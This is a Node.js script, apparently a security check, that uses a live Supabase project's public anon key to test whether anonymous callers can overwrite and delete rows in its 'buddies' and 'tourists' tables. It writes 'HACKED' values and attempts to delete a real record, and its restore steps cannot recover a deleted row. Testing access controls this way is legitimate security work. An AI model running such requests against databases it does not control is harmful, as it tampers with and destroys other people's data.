#!/usr/bin/env node
/**
 * Critical verification: confirm anon can PATCH buddies/tourists and the change persists.
 */

const SUPA = 'https://pqvnjgyqbxlylawwogjv.supabase.co'
const ANON = 'sb_publishable_3uRUZqdvazd4cENt8WOWJA_SB7HmCEE'

async function req(url, init = {}) {
  const r = await fetch(url, init)
  const text = await r.text()
  let json = null
  try { json = JSON.parse(text) } catch {}
  return { status: r.status, text, json }
}

async function main() {
  // 1. Read bio before
  const before = await req(`${SUPA}/rest/v1/buddies?id=eq.55555555-5555-5555-5555-555555555555&select=id,location_city,bio`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('BEFORE:', JSON.stringify(before.json, null, 2))

  // 2. PATCH as anon
  const patch = await req(`${SUPA}/rest/v1/buddies?id=eq.55555555-5555-5555-5555-555555555555`, {
    method: 'PATCH',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json' },
    body: JSON.stringify({ bio: 'HACKED-BY-ANON-' + Date.now() }),
  })
  console.log('PATCH:', patch.status, patch.text.slice(0, 300))

  // 3. Read bio after
  const after = await req(`${SUPA}/rest/v1/buddies?id=eq.55555555-5555-5555-5555-555555555555&select=id,location_city,bio`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('AFTER:', JSON.stringify(after.json, null, 2))

  // 4. Same test on tourists
  const tBefore = await req(`${SUPA}/rest/v1/tourists?id=eq.8600582a-217f-496e-8ed9-820007d4fdd4&select=id,bio,nationality`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('\nTOURIST BEFORE:', JSON.stringify(tBefore.json, null, 2))

  const tPatch = await req(`${SUPA}/rest/v1/tourists?id=eq.8600582a-217f-496e-8ed9-820007d4fdd4`, {
    method: 'PATCH',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json' },
    body: JSON.stringify({ nationality: 'HACKED' }),
  })
  console.log('TOURIST PATCH:', tPatch.status, tPatch.text.slice(0, 300))

  const tAfter = await req(`${SUPA}/rest/v1/tourists?id=eq.8600582a-217f-496e-8ed9-820007d4fdd4&select=id,bio,nationality`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('TOURIST AFTER:', JSON.stringify(tAfter.json, null, 2))

  // 5. Try DELETE
  console.log('\n=== DELETE test ===')
  // Use a fake id (won't delete a real row)
  const del = await req(`${SUPA}/rest/v1/buddies?id=eq.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa`, {
    method: 'DELETE',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('DELETE fake buddy:', del.status, del.text.slice(0, 300))

  // 6. Try to DELETE a real buddy
  const delReal = await req(`${SUPA}/rest/v1/buddies?id=eq.55555555-5555-5555-5555-555555555555`, {
    method: 'DELETE',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('DELETE real buddy:', delReal.status, delReal.text.slice(0, 300))

  // 7. Restore the bio we hacked
  const restore = await req(`${SUPA}/rest/v1/buddies?id=eq.55555555-5555-5555-5555-555555555555`, {
    method: 'PATCH',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json' },
    body: JSON.stringify({ bio: 'Beach and diving expert. The ocean is my second home!' }),
  })
  console.log('\nRESTORE buddy bio:', restore.status, restore.text.slice(0, 100))

  // Restore tourist nationality
  const restoreT = await req(`${SUPA}/rest/v1/tourists?id=eq.8600582a-217f-496e-8ed9-820007d4fdd4`, {
    method: 'PATCH',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json' },
    body: JSON.stringify({ nationality: 'United States' }),
  })
  console.log('RESTORE tourist nationality:', restoreT.status, restoreT.text.slice(0, 100))
}

main().catch(e => { console.error('FATAL', e); process.exit(1) })